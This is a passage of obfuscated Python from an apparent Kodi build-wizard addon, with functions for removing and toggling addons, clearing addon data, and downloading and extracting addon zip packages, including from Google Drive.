	OO00000000O00OOOO =glob .glob (os .path .join (ADDONS ,'*/'))#line:2965
	OOOO00OO0OOOOO000 =[];OO0O000000O0OOO00 =[]#line:2966
	for O00O00OOO00OOOO0O in sorted (OO00000000O00OOOO ,key =lambda O000O0O00OO00OOOO :O000O0O00OO00OOOO ):#line:2967
		O0O0OOOO0OO0O0O00 =os .path .split (O00O00OOO00OOOO0O [:-1 ])[1 ]#line:2968
		if O0O0OOOO0OO0O0O00 in EXCLUDES :continue #line:2969
		elif O0O0OOOO0OO0O0O00 in DEFAULTPLUGINS :continue #line:2970
		elif O0O0OOOO0OO0O0O00 =='packages':continue #line:2971
		OOOO00OOOOOOO0O0O =os .path .join (O00O00OOO00OOOO0O ,'addon.xml')#line:2972
		if os .path .exists (OOOO00OOOOOOO0O0O ):#line:2973
			O0OOO0OO0OOOOO0OO =open (OOOO00OOOOOOO0O0O )#line:2974
			O0OO0O00O00OOOOO0 =O0OOO0OO0OOOOO0OO .read ()#line:2975
			O0OOOO0O0O00O0OOO =wiz .parseDOM (O0OO0O00O00OOOOO0 ,'addon',ret ='id')#line:2976
			O000O00O00OOOO0OO =O0O0OOOO0OO0O0O00 if len (O0OOOO0O0O00O0OOO )==0 else O0OOOO0O0O00O0OOO [0 ]#line:2978
			try :#line:2979
				O0OOOOO0OO0O00O0O =xbmcaddon .Addon (id =O000O00O00OOOO0OO )#line:2980
				OOOO00OO0OOOOO000 .append (O0OOOOO0OO0O00O0O .getAddonInfo ('name'))#line:2981
				OO0O000000O0OOO00 .append (O000O00O00OOOO0OO )#line:2982
			except :#line:2983
				pass #line:2984
	if len (OOOO00OO0OOOOO000 )==0 :#line:2985
		wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]No Addons To Remove[/COLOR]"%COLOR2 )#line:2986
		return #line:2987
	if KODIV >16 :#line:2988
		O0O0O0O000O0O000O =DIALOG .multiselect ("%s: Select the addons you wish to remove."%ADDONTITLE ,OOOO00OO0OOOOO000 )#line:2989
	else :#line:2990
		O0O0O0O000O0O000O =[];OOOOO00OO00OOO00O =0 #line:2991
		O0O0OO0O0OOO0OO00 =["-- Click here to Continue --"]+OOOO00OO0OOOOO000 #line:2992
		while not OOOOO00OO00OOO00O ==-1 :#line:2993
			OOOOO00OO00OOO00O =DIALOG .select ("%s: Select the addons you wish to remove."%ADDONTITLE ,O0O0OO0O0OOO0OO00 )#line:2994
			if OOOOO00OO00OOO00O ==-1 :break #line:2995
			elif OOOOO00OO00OOO00O ==0 :break #line:2996
			else :#line:2997
				O0O0O000OO0OOOOOO =(OOOOO00OO00OOO00O -1 )#line:2998
				if O0O0O000OO0OOOOOO in O0O0O0O000O0O000O :#line:2999
					O0O0O0O000O0O000O .remove (O0O0O000OO0OOOOOO )#line:3000
					O0O0OO0O0OOO0OO00 [OOOOO00OO00OOO00O ]=OOOO00OO0OOOOO000 [O0O0O000OO0OOOOOO ]#line:3001
				else :#line:3002
					O0O0O0O000O0O000O .append (O0O0O000OO0OOOOOO )#line:3003
					O0O0OO0O0OOO0OO00 [OOOOO00OO00OOO00O ]="[B][COLOR %s]%s[/COLOR][/B]"%(COLOR1 ,OOOO00OO0OOOOO000 [O0O0O000OO0OOOOOO ])#line:3004
	if O0O0O0O000O0O000O ==None :return #line:3005
	if len (O0O0O0O000O0O000O )>0 :#line:3006
		wiz .addonUpdates ('set')#line:3007
		for O00OOOO0O00O00O0O in O0O0O0O000O0O000O :#line:3008
			removeAddon (OO0O000000O0OOO00 [O00OOOO0O00O00O0O ],OOOO00OO0OOOOO000 [O00OOOO0O00O00O0O ],True )#line:3009
		xbmc .sleep (1000 )#line:3011
		if INSTALLMETHOD ==1 :O0O0O00O0O0OO0OOO =1 #line:3013
		elif INSTALLMETHOD ==2 :O0O0O00O0O0OO0OOO =0 #line:3014
		else :O0O0O00O0O0OO0OOO =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]סיום התקנה [COLOR %s]סגירה[/COLOR] או [COLOR %s]הצג נתונים[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),yeslabel ="[B][COLOR green]הצג נתונים[/COLOR][/B]",nolabel ="[B][COLOR red]סגירה[/COLOR][/B]")#line:3015
		if O0O0O00O0O0OO0OOO ==1 :wiz .reloadFix ('remove addon')#line:3016
		else :wiz .addonUpdates ('reset');wiz .killxbmc (True )#line:3017
def removeAddonDataMenu ():#line:3019
	if os .path .exists (ADDOND ):#line:3020
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] All Addon_Data','removedata','all',themeit =THEME2 )#line:3021
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] All Addon_Data for Uninstalled Addons','removedata','uninstalled',themeit =THEME2 )#line:3022
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] All Empty Folders in Addon_Data','removedata','empty',themeit =THEME2 )#line:3023
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] %s Addon_Data'%ADDONTITLE ,'resetaddon',themeit =THEME2 )#line:3024
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:3025
		OOOO0OO00OO00OOO0 =glob .glob (os .path .join (ADDOND ,'*/'))#line:3026
		for O0OOOOO000OO0O0O0 in sorted (OOOO0OO00OO00OOO0 ,key =lambda OOOOO0OO0OO0000O0 :OOOOO0OO0OO0000O0 ):#line:3027
			O000O0OOO0000OOO0 =O0OOOOO000OO0O0O0 .replace (ADDOND ,'').replace ('\\','').replace ('/','')#line:3028
			OOO000OOO000000OO =os .path .join (O0OOOOO000OO0O0O0 .replace (ADDOND ,ADDONS ),'icon.png')#line:3029
			O00OO0OO00OOO0O0O =os .path .join (O0OOOOO000OO0O0O0 .replace (ADDOND ,ADDONS ),'fanart.png')#line:3030
			OO00OOOOO000O00OO =O000O0OOO0000OOO0 #line:3031
			OO00OOO000O0O00OO ={'audio.':'[COLOR orange][AUDIO] [/COLOR]','metadata.':'[COLOR cyan][METADATA] [/COLOR]','module.':'[COLOR orange][MODULE] [/COLOR]','plugin.':'[COLOR blue][PLUGIN] [/COLOR]','program.':'[COLOR orange][PROGRAM] [/COLOR]','repository.':'[COLOR gold][REPO] [/COLOR]','script.':'[COLOR green][SCRIPT] [/COLOR]','service.':'[COLOR green][SERVICE] [/COLOR]','skin.':'[COLOR dodgerblue][SKIN] [/COLOR]','video.':'[COLOR orange][VIDEO] [/COLOR]','weather.':'[COLOR yellow][WEATHER] [/COLOR]'}#line:3032
			for OO0000O0OO00O00OO in OO00OOO000O0O00OO :#line:3033
				OO00OOOOO000O00OO =OO00OOOOO000O00OO .replace (OO0000O0OO00O00OO ,OO00OOO000O0O00OO [OO0000O0OO00O00OO ])#line:3034
			if O000O0OOO0000OOO0 in EXCLUDES :OO00OOOOO000O00OO ='[COLOR green][B][PROTECTED][/B][/COLOR] %s'%OO00OOOOO000O00OO #line:3035
			else :OO00OOOOO000O00OO ='[COLOR red][B][REMOVE][/B][/COLOR] %s'%OO00OOOOO000O00OO #line:3036
			addFile (' %s'%OO00OOOOO000O00OO ,'removedata',O000O0OOO0000OOO0 ,icon =OOO000OOO000000OO ,fanart =O00OO0OO00OOO0O0O ,themeit =THEME2 )#line:3037
	else :#line:3038
		addFile ('No Addon data folder found.','',themeit =THEME3 )#line:3039
	setView ('files','viewType')#line:3040
def enableAddons ():#line:3042
	addFile ("[I][B][COLOR red]!!Notice: Disabling Some Addons Can Cause Issues!![/COLOR][/B][/I]",'',icon =ICONMAINT )#line:3043
	OO00OO0OOO00OOO0O =glob .glob (os .path .join (ADDONS ,'*/'))#line:3044
	OOO000OOOO0OO000O =0 #line:3045
	for O0OOOOO000O00OO00 in sorted (OO00OO0OOO00OOO0O ,key =lambda O0OO0O0000000OOO0 :O0OO0O0000000OOO0 ):#line:3046
		OOOOOO0OOOOO00O0O =os .path .split (O0OOOOO000O00OO00 [:-1 ])[1 ]#line:3047
		if OOOOOO0OOOOO00O0O in EXCLUDES :continue #line:3048
		if OOOOOO0OOOOO00O0O in DEFAULTPLUGINS :continue #line:3049
		O0O0000O0O0OO0OOO =os .path .join (O0OOOOO000O00OO00 ,'addon.xml')#line:3050
		if os .path .exists (O0O0000O0O0OO0OOO ):#line:3051
			OOO000OOOO0OO000O +=1 #line:3052
			OO00OO0OOO00OOO0O =O0OOOOO000O00OO00 .replace (ADDONS ,'')[1 :-1 ]#line:3053
			OOO0OO0O0O00O0O0O =open (O0O0000O0O0OO0OOO )#line:3054
			O00O0O0O000O0O000 =OOO0OO0O0O00O0O0O .read ().replace ('\n','').replace ('\r','').replace ('\t','')#line:3055
			OO0O000O0O0OOO000 =wiz .parseDOM (O00O0O0O000O0O000 ,'addon',ret ='id')#line:3056
			OOOOO0OO0O0OOOOO0 =wiz .parseDOM (O00O0O0O000O0O000 ,'addon',ret ='name')#line:3057
			try :#line:3058
				OOOOOOO000000000O =OO0O000O0O0OOO000 [0 ]#line:3059
				O0000O0OOOO0O00OO =OOOOO0OO0O0OOOOO0 [0 ]#line:3060
			except :#line:3061
				continue #line:3062
			try :#line:3063
				O00O0000OO0OOO00O =xbmcaddon .Addon (id =OOOOOOO000000000O )#line:3064
				OOO000O0OO0O0OO00 ="[COLOR green][Enabled][/COLOR]"#line:3065
				O0OOO00O0O0OO00OO ="false"#line:3066
			except :#line:3067
				OOO000O0OO0O0OO00 ="[COLOR red][Disabled][/COLOR]"#line:3068
				O0OOO00O0O0OO00OO ="true"#line:3069
				pass #line:3070
			O00O0OO0O00OOOO00 =os .path .join (O0OOOOO000O00OO00 ,'icon.png')if os .path .exists (os .path .join (O0OOOOO000O00OO00 ,'icon.png'))else ICON #line:3071
			O0000O0OO0000000O =os .path .join (O0OOOOO000O00OO00 ,'fanart.jpg')if os .path .exists (os .path .join (O0OOOOO000O00OO00 ,'fanart.jpg'))else FANART #line:3072
			addFile ("%s %s"%(OOO000O0OO0O0OO00 ,O0000O0OOOO0O00OO ),'toggleaddon',OO00OO0OOO00OOO0O ,O0OOO00O0O0OO00OO ,icon =O00O0OO0O00OOOO00 ,fanart =O0000O0OO0000000O )#line:3073
			OOO0OO0O0O00O0O0O .close ()#line:3074
	if OOO000OOOO0OO000O ==0 :#line:3075
		addFile ("No Addons Found to Enable or Disable.",'',icon =ICONMAINT )#line:3076
	setView ('files','viewType')#line:3077
def changeFeq ():#line:3079
	O0OO0OO0OO0000000 =['Every Startup','Every Day','Every Three Days','Every Weekly']#line:3080
	OOOO00OO0O0OO0O0O =DIALOG .select ("[COLOR %s]How often would you list to Auto Clean on Startup?[/COLOR]"%COLOR2 ,O0OO0OO0OO0000000 )#line:3081
	if not OOOO00OO0O0OO0O0O ==-1 :#line:3082
		wiz .setS ('autocleanfeq',str (OOOO00OO0O0OO0O0O ))#line:3083
		wiz .LogNotify ('[COLOR %s]Auto Clean Up[/COLOR]'%COLOR1 ,'[COLOR %s]Fequency Now %s[/COLOR]'%(COLOR2 ,O0OO0OO0OO0000000 [OOOO00OO0O0OO0O0O ]))#line:3084
def developer ():#line:3086
	addFile ('Convert Text Files to 0.1.7','converttext',themeit =THEME1 )#line:3087
	addFile ('Create QR Code','createqr',themeit =THEME1 )#line:3088
	addFile ('Test Notifications','testnotify',themeit =THEME1 )#line:3089
	addFile ('Test Update','testupdate',themeit =THEME1 )#line:3090
	addFile ('Test First Run','testfirst',themeit =THEME1 )#line:3091
	addFile ('Test First Run Settings','testfirstrun',themeit =THEME1 )#line:3092
	addFile ('Test APk','testapk',themeit =THEME1 )#line:3093
	setView ('files','viewType')#line:3095
def download (O0OOO0000000O0O00 ,OO0000OO000000000 ):#line:3100
  OOOOO0OOO00O0OOO0 =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:3101
  OO0000000000O0000 =xbmcgui .DialogProgress ()#line:3102
  OO0000000000O0000 .create ("XBMC ISRAEL","Downloading "+name ,'','Please Wait')#line:3103
  O0O00000O000OO0O0 =os .path .join (OOOOO0OOO00O0OOO0 ,'isr.zip')#line:3104
  O0OOO000000O0O000 =urllib2 .Request (O0OOO0000000O0O00 )#line:3105
  OOOO00OO00O00O000 =urllib2 .urlopen (O0OOO000000O0O000 )#line:3106
  O00O0000OOOOOOO0O =xbmcgui .DialogProgress ()#line:3108
  O00O0000OOOOOOO0O .create ("Downloading","Downloading "+name )#line:3109
  O00O0000OOOOOOO0O .update (0 )#line:3110
  OOO00O0O000O0OO00 =OO0000OO000000000 #line:3111
  O0000O0O00OO00OO0 =open (O0O00000O000OO0O0 ,'wb')#line:3112
  try :#line:3114
    O0O0O00O0O0OO0000 =OOOO00OO00O00O000 .info ().getheader ('Content-Length').strip ()#line:3115
    O0000OOOOO0O0OOOO =True #line:3116
  except AttributeError :#line:3117
        O0000OOOOO0O0OOOO =False #line:3118
  if O0000OOOOO0O0OOOO :#line:3120
        O0O0O00O0O0OO0000 =int (O0O0O00O0O0OO0000 )#line:3121
  O00OO00O0O00O00O0 =0 #line:3123
  O00O00OOOOO00OO00 =time .time ()#line:3124
  while True :#line:3125
        OO0OOO0000OO000O0 =OOOO00OO00O00O000 .read (8192 )#line:3126
        if not OO0OOO0000OO000O0 :#line:3127
            sys .stdout .write ('\n')#line:3128
            break #line:3129
        O00OO00O0O00O00O0 +=len (OO0OOO0000OO000O0 )#line:3131
        O0000O0O00OO00OO0 .write (OO0OOO0000OO000O0 )#line:3132
        if not O0000OOOOO0O0OOOO :#line:3134
            O0O0O00O0O0OO0000 =O00OO00O0O00O00O0 #line:3135
        if O00O0000OOOOOOO0O .iscanceled ():#line:3136
           O00O0000OOOOOOO0O .close ()#line:3137
           try :#line:3138
            os .remove (O0O00000O000OO0O0 )#line:3139
           except :#line:3140
            pass #line:3141
           break #line:3142
        OOOO00O00000000O0 =float (O00OO00O0O00O00O0 )/O0O0O00O0O0OO0000 #line:3143
        OOOO00O00000000O0 =round (OOOO00O00000000O0 *100 ,2 )#line:3144
        O0O0O0OO00O00O000 =O00OO00O0O00O00O0 /(1024 *1024 )#line:3145
        OOO000000OOOOO000 =O0O0O00O0O0OO0000 /(1024 *1024 )#line:3146
        OO00OO00OO0000O0O ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',O0O0O0OO00O00O000 ,'teal',OOO000000OOOOO000 )#line:3147
        if (time .time ()-O00O00OOOOO00OO00 )>0 :#line:3148
          OO0O000O0000O0000 =O00OO00O0O00O00O0 /(time .time ()-O00O00OOOOO00OO00 )#line:3149
          OO0O000O0000O0000 =OO0O000O0000O0000 /1024 #line:3150
        else :#line:3151
         OO0O000O0000O0000 =0 #line:3152
        O00OO0O0OOOOOO000 ='KB'#line:3153
        if OO0O000O0000O0000 >=1024 :#line:3154
           OO0O000O0000O0000 =OO0O000O0000O0000 /1024 #line:3155
           O00OO0O0OOOOOO000 ='MB'#line:3156
        if OO0O000O0000O0000 >0 and not OOOO00O00000000O0 ==100 :#line:3157
            OOO0OOO0O000000OO =(O0O0O00O0O0OO0000 -O00OO00O0O00O00O0 )/OO0O000O0000O0000 #line:3158
        else :#line:3159
            OOO0OOO0O000000OO =0 #line:3160
        OOOOOO0O00O00OO00 ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',OO0O000O0000O0000 ,O00OO0O0OOOOOO000 )#line:3161
        O00O0000OOOOOOO0O .update (int (OOOO00O00000000O0 ),"Downloading "+name ,OO00OO00OO0000O0O ,OOOOOO0O00O00OO00 )#line:3163
  O0OO0O00OOOO00000 =xbmc .translatePath (os .path .join ('special://home','addons'))#line:3166
  O0000O0O00OO00OO0 .close ()#line:3168
  extract (O0O00000O000OO0O0 ,O0OO0O00OOOO00000 ,O00O0000OOOOOOO0O )#line:3170
  if os .path .exists (O0OO0O00OOOO00000 +'/scakemyer-script.quasar.burst'):#line:3171
    if os .path .exists (O0OO0O00OOOO00000 +'/script.quasar.burst'):#line:3172
     shutil .rmtree (O0OO0O00OOOO00000 +'/script.quasar.burst',ignore_errors =False )#line:3173
    os .rename (O0OO0O00OOOO00000 +'/scakemyer-script.quasar.burst',O0OO0O00OOOO00000 +'/script.quasar.burst')#line:3174
  if os .path .exists (O0OO0O00OOOO00000 +'/plugin.video.kmediatorrent-master'):#line:3176
    if os .path .exists (O0OO0O00OOOO00000 +'/plugin.video.kmediatorrent'):#line:3177
     shutil .rmtree (O0OO0O00OOOO00000 +'/plugin.video.kmediatorrent',ignore_errors =False )#line:3178
    os .rename (O0OO0O00OOOO00000 +'/plugin.video.kmediatorrent-master',O0OO0O00OOOO00000 +'/plugin.video.kmediatorrent')#line:3179
  xbmc .executebuiltin ('UpdateLocalAddons ')#line:3180
  xbmc .executebuiltin ("UpdateAddonRepos")#line:3181
  try :#line:3182
    os .remove (O0O00000O000OO0O0 )#line:3183
  except :#line:3184
    pass #line:3185
  O00O0000OOOOOOO0O .close ()#line:3186
def dis_or_enable_addon (O0000OOO00OOOOO00 ,OOO0O0OO0OOOOOO00 ,enable ="true"):#line:3187
    import json #line:3188
    O0O000O00OOOOO0O0 ='"%s"'%O0000OOO00OOOOO00 #line:3189
    if xbmc .getCondVisibility ("System.HasAddon(%s)"%O0000OOO00OOOOO00 )and enable =="true":#line:3190
        logging .warning ('already Enabled')#line:3191
        return xbmc .log ("### Skipped %s, reason = allready enabled"%O0000OOO00OOOOO00 )#line:3192
    elif not xbmc .getCondVisibility ("System.HasAddon(%s)"%O0000OOO00OOOOO00 )and enable =="false":#line:3193
        return xbmc .log ("### Skipped %s, reason = not installed"%O0000OOO00OOOOO00 )#line:3194
    else :#line:3195
        O000OOOO000O00OOO ='{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled","params":{"addonid":%s,"enabled":%s}}'%(O0O000O00OOOOO0O0 ,enable )#line:3196
        O0000O0OOOOO0O0O0 =xbmc .executeJSONRPC (O000OOOO000O00OOO )#line:3197
        OO0OOO00O00O0OO00 =json .loads (O0000O0OOOOO0O0O0 )#line:3198
        if enable =="true":#line:3199
            xbmc .log ("### Enabled %s, response = %s"%(O0000OOO00OOOOO00 ,OO0OOO00O00O0OO00 ))#line:3200
        else :#line:3201
            xbmc .log ("### Disabled %s, response = %s"%(O0000OOO00OOOOO00 ,OO0OOO00O00O0OO00 ))#line:3202
    if OOO0O0OO0OOOOOO00 =='auto':#line:3203
     return True #line:3204
    return xbmc .executebuiltin ('Container.Update(%s)'%xbmc .getInfoLabel ('Container.FolderPath'))#line:3205
def chunk_report (OO0O00O0O0O0000OO ,OO0O0OO000O00OOOO ,OO00OO0O000O0O00O ):#line:3206
   O00OO0O0O0000000O =float (OO0O00O0O0O0000OO )/OO00OO0O000O0O00O #line:3207
   O00OO0O0O0000000O =round (O00OO0O0O0000000O *100 ,2 )#line:3208
   if OO0O00O0O0O0000OO >=OO00OO0O000O0O00O :#line:3210
      sys .stdout .write ('\n')#line:3211
def chunk_read (OO00OO000OO0OO000 ,chunk_size =8192 ,report_hook =None ,dp =None ,destination ='',filesize =1000000 ):#line:3213
   import time #line:3214
   O0OOOOOO00O0O0000 =int (filesize )*1000000 #line:3215
   O0OOOO0O0OO00O00O =0 #line:3217
   O00O0OO00O00OOO00 =time .time ()#line:3218
   O0OO000O0OO000OOO =0 #line:3219
   logging .warning ('Downloading')#line:3221
   with open (destination ,"wb")as OO0000OOO00O0O0OO :#line:3222
    while 1 :#line:3223
      OOO0000OO00O0000O =time .time ()-O00O0OO00O00OOO00 #line:3224
      O0O00OO0O0O0OO00O =int (O0OO000O0OO000OOO *chunk_size )#line:3225
      OOOOO0OOO00O0O000 =OO00OO000OO0OO000 .read (chunk_size )#line:3226
      OO0000OOO00O0O0OO .write (OOOOO0OOO00O0O000 )#line:3227
      OO0000OOO00O0O0OO .flush ()#line:3228
      O0OOOO0O0OO00O00O +=len (OOOOO0OOO00O0O000 )#line:3229
      O0O0OOOOOO000OO00 =float (O0OOOO0O0OO00O00O )/O0OOOOOO00O0O0000 #line:3230
      O0O0OOOOOO000OO00 =round (O0O0OOOOOO000OO00 *100 ,2 )#line:3231
      if int (OOO0000OO00O0000O )>0 :#line:3232
        OO0000O0OOOO0O0O0 =int (O0O00OO0O0O0OO00O /(1024 *OOO0000OO00O0000O ))#line:3233
      else :#line:3234
         OO0000O0OOOO0O0O0 =0 #line:3235
      if OO0000O0OOOO0O0O0 >1024 and not O0O0OOOOOO000OO00 ==100 :#line:3236
          O0O0O0OO000OOOOOO =int (((O0OOOOOO00O0O0000 -O0O00OO0O0O0OO00O )/1024 )/(OO0000O0OOOO0O0O0 ))#line:3237
      else :#line:3238
          O0O0O0OO000OOOOOO =0 #line:3239
      if O0O0O0OO000OOOOOO <0 :#line:3240
        O0O0O0OO000OOOOOO =0 #line:3241
      dp .update (int (O0O0OOOOOO000OO00 ),name ,"\r%d%%,[COLOR aqua] %d MB / %d MB [/COLOR], %d KB/s "%(O0O0OOOOOO000OO00 ,O0O00OO0O0O0OO00O /(1024 *1024 ),O0OOOOOO00O0O0000 /(1000 *1000 ),OO0000O0OOOO0O0O0 ),'[B]ETA:[/B] [COLOR aqua]%02d:%02d[/COLOR]'%divmod (O0O0O0OO000OOOOOO ,60 ))#line:3242
      if dp .iscanceled ():#line:3243
         dp .close ()#line:3244
         break #line:3245
      if not OOOOO0OOO00O0O000 :#line:3246
         break #line:3247
      if report_hook :#line:3249
         report_hook (O0OOOO0O0OO00O00O ,chunk_size ,O0OOOOOO00O0O0000 )#line:3250
      O0OO000O0OO000OOO +=1 #line:3251
   logging .warning ('END Downloading')#line:3252
   return O0OOOO0O0OO00O00O #line:3253
def googledrive_download (OOO00O0O0OO0OO0OO ,O0O0OO0OO0OOOOO0O ,OOOOOO000O00O000O ,OOOO00OO0O00OOOOO ):#line:3255
    OO0OO0000OOOO0000 =[]#line:3259
    OOO0O0O0000OOOO0O =OOO00O0O0OO0OO0OO .split ('=')#line:3260
    OOO00O0O0OO0OO0OO =OOO0O0O0000OOOO0O [len (OOO0O0O0000OOOO0O )-1 ]#line:3261
    def OO0OOO0OO000O000O (OOOOO00O0O0000OOO ):#line:3263
        for OOOOO0OO00O0O00O0 in OOOOO00O0O0000OOO :#line:3265
            logging .warning ('cookie.name')#line:3266
            logging .warning (OOOOO0OO00O0O00O0 .name )#line:3267
            O000OOO0O0O0OOOOO =OOOOO0OO00O0O00O0 .value #line:3268
            if 'download_warning'in OOOOO0OO00O0O00O0 .name :#line:3269
                logging .warning (OOOOO0OO00O0O00O0 .value )#line:3270
                logging .warning ('cookie.value')#line:3271
                return OOOOO0OO00O0O00O0 .value #line:3272
            return O000OOO0O0O0OOOOO #line:3273
        return None #line:3275
    def OOO0O00OO00O00OO0 (O0000OOO0O0O0000O ,OO00OOOO0O0O0OOO0 ):#line:3277
        O000O000O0O0O00OO =32768 #line:3279
        OO0OO0OOOOO00O00O =time .time ()#line:3280
        with open (OO00OOOO0O0O0OOO0 ,"wb")as O0000OO00000O0O00 :#line:3282
            O0OOOOO0O00OO0OO0 =1 #line:3283
            OOOOOOO0OOO000O00 =32768 #line:3284
            try :#line:3285
                OO000OO00O0000O00 =int (O0000OOO0O0O0000O .headers .get ('content-length'))#line:3286
                print ('file total size :',OO000OO00O0000O00 )#line:3287
            except TypeError :#line:3288
                print ('using dummy length !!!')#line:3289
                OO000OO00O0000O00 =int (OOOO00OO0O00OOOOO )*1000000 #line:3290
            for O00OO0O000OO00OOO in O0000OOO0O0O0000O .iter_content (O000O000O0O0O00OO ):#line:3291
                if O00OO0O000OO00OOO :#line:3292
                    O0000OO00000O0O00 .write (O00OO0O000OO00OOO )#line:3293
                    O0000OO00000O0O00 .flush ()#line:3294
                    O000OO0000000O0O0 =time .time ()-OO0OO0OOOOO00O00O #line:3295
                    O00OO000OOO0O0000 =int (O0OOOOO0O00OO0OO0 *OOOOOOO0OOO000O00 )#line:3296
                    if O000OO0000000O0O0 ==0 :#line:3297
                        O000OO0000000O0O0 =0.1 #line:3298
                    OO0O0OOOO00OOO00O =int (O00OO000OOO0O0000 /(1024 *O000OO0000000O0O0 ))#line:3299
                    O0O0O0O00OO0O0OOO =int (O0OOOOO0O00OO0OO0 *OOOOOOO0OOO000O00 *100 /OO000OO00O0000O00 )#line:3300
                    if OO0O0OOOO00OOO00O >1024 and not O0O0O0O00OO0O0OOO ==100 :#line:3301
                      OO0O0000000O0OOOO =int (((OO000OO00O0000O00 -O00OO000OOO0O0000 )/1024 )/(OO0O0OOOO00OOO00O ))#line:3302
                    else :#line:3303
                      OO0O0000000O0OOOO =0 #line:3304
                    OOOOOO000O00O000O .update (int (O0O0O0O00OO0O0OOO ),name ,"\r%d%%,[COLOR aqua] %d MB / %d MB [/COLOR], %d KB/s "%(O0O0O0O00OO0O0OOO ,O00OO000OOO0O0000 /(1024 *1024 ),OO000OO00O0000O00 /(1000 *1000 ),OO0O0OOOO00OOO00O ),'[B]ETA:[/B] [COLOR aqua]%02d:%02d[/COLOR]'%divmod (OO0O0000000O0OOOO ,60 ))#line:3306
                    O0OOOOO0O00OO0OO0 +=1 #line:3307
                    if OOOOOO000O00O000O .iscanceled ():#line:3308
                     OOOOOO000O00O000O .close ()#line:3309
                     break #line:3310
    O00O0O000OO0O0O00 ="https://docs.google.com/uc?export=download"#line:3311
    import urllib2 #line:3316
    import cookielib #line:3317
    from cookielib import CookieJar #line:3319
    O000O00OOOO000OO0 =CookieJar ()#line:3321
    OO0000000OO0OO00O =urllib2 .build_opener (urllib2 .HTTPCookieProcessor (O000O00OOOO000OO0 ))#line:3322
    OO0OOO00O0000OOO0 ={'id':OOO00O0O0OO0OO0OO }#line:3324
    O0O0000O0O00000O0 =urllib .urlencode (OO0OOO00O0000OOO0 )#line:3325
    logging .warning (O00O0O000OO0O0O00 +'&'+O0O0000O0O00000O0 )#line:3326
    OO000OO0000O0OOOO =OO0000000OO0OO00O .open (O00O0O000OO0O0O00 +'&'+O0O0000O0O00000O0 )#line:3327
    OO0OOOO0OOOOOO0OO =OO000OO0000O0OOOO .read ()#line:3328
    for O0O000OOO0OOOO0OO in O000O00OOOO000OO0 :#line:3330
         logging .warning (O0O000OOO0OOOO0OO )#line:3331
    O00OO000O0O0O0OOO =OO0OOO0OO000O000O (O000O00OOOO000OO0 )#line:3332
    logging .warning (O00OO000O0O0O0OOO )#line:3333
    if O00OO000O0O0O0OOO :#line:3334
        OO00OO0O00O00O000 ={'id':OOO00O0O0OO0OO0OO ,'confirm':O00OO000O0O0O0OOO }#line:3335
        O000O0OOO0O00000O ={'Access-Control-Allow-Headers':'Content-Length'}#line:3336
        O0O0000O0O00000O0 =urllib .urlencode (OO00OO0O00O00O000 )#line:3337
        OO000OO0000O0OOOO =OO0000000OO0OO00O .open (O00O0O000OO0O0O00 +'&'+O0O0000O0O00000O0 )#line:3338
        chunk_read (OO000OO0000O0OOOO ,report_hook =chunk_report ,dp =OOOOOO000O00O000O ,destination =O0O0OO0OO0OOOOO0O ,filesize =OOOO00OO0O00OOOOO )#line:3339
    return (OO0OO0000OOOO0000 )#line:3343
def kodi17Fix ():#line:3344
	O000OO00O000OOOOO =glob .glob (os .path .join (ADDONS ,'*/'))#line:3345
	OO00000OOO00OO000 =[]#line:3346
	for OO00OO0O0OO000OOO in sorted (O000OO00O000OOOOO ,key =lambda O00O000OOO0000OOO :O00O000OOO0000OOO ):#line:3347
		O0O0O0OO0O0OOOOOO =os .path .join (OO00OO0O0OO000OOO ,'addon.xml')#line:3348
		if os .path .exists (O0O0O0OO0O0OOOOOO ):#line:3349
			O00O0O0OO0O000000 =OO00OO0O0OO000OOO .replace (ADDONS ,'')[1 :-1 ]#line:3350
			OO000O00O0OOOO00O =open (O0O0O0OO0O0OOOOOO )#line:3351
			OO0OO0OO0O0O00OO0 =OO000O00O0OOOO00O .read ()#line:3352
			OOO0OOO0OOOO000OO =parseDOM (OO0OO0OO0O0O00OO0 ,'addon',ret ='id')#line:3353
			OO000O00O0OOOO00O .close ()#line:3354
			try :#line:3355
				O0OO0OO0O0OOO0OOO =xbmcaddon .Addon (id =OOO0OOO0OOOO000OO [0 ])#line:3356
			except :#line:3357
				try :#line:3358
					log ("%s was disabled"%OOO0OOO0OOOO000OO [0 ],xbmc .LOGDEBUG )#line:3359
					OO00000OOO00OO000 .append (OOO0OOO0OOOO000OO [0 ])#line:3360
				except :#line:3361
					try :#line:3362
						log ("%s was disabled"%O00O0O0OO0O000000 ,xbmc .LOGDEBUG )#line:3363
						OO00000OOO00OO000 .append (O00O0O0OO0O000000 )#line:3364
					except :#line:3365
						if len (OOO0OOO0OOOO000OO )==0 :log ("Unabled to enable: %s(Cannot Determine Addon ID)"%O00O0O0OO0O000000 ,xbmc .LOGERROR )#line:3366
						else :log ("Unabled to enable: %s"%OO00OO0O0OO000OOO ,xbmc .LOGERROR )#line:3367
	if len (OO00000OOO00OO000 )>0 :#line:3368
		OOO0O00O0000O000O =0 #line:3369
		DP .create (ADDONTITLE ,'[COLOR %s]Enabling disabled Addons'%COLOR2 ,'','Please Wait[/COLOR]')#line:3370
		for O00OO0O000000OO00 in OO00000OOO00OO000 :#line:3371
			OOO0O00O0000O000O +=1 #line:3372
			O0OO00OO000OOOOOO =int (percentage (OOO0O00O0000O000O ,len (OO00000OOO00OO000 )))#line:3373
			DP .update (O0OO00OO000OOOOOO ,"","Enabling: [COLOR %s]%s[/COLOR]"%(COLOR1 ,O00OO0O000000OO00 ))#line:3374
			addonDatabase (O00OO0O000000OO00 ,1 )#line:3375
			if DP .iscanceled ():break #line:3376
		if DP .iscanceled ():#line:3377
			DP .close ()#line:3378
